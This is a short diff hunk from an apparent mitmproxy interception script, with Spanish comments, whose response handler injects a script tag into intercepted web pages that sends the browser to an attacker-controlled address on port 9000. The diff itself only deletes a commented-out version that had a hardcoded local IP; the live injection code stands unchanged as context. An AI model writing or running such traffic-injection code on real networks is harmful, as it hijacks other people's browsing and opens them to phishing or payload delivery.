@@ -22,5 +22,3 @@ def response(flow):
     script = f"</body><script>location = 'http://{local_ipv4}:9000'</script>"
     # Convertimos el string a bytes (usando UTF-8) y lo usamos para el reemplazo.
     flow.response.content = flow.response.content.replace(b"</body>", script.encode('utf-8'))
-
-    #flow.response.content  = flow.response.content.replace(b"</body>", b"</body><script>location = 'http://192.168.1.51:9000'</script>")
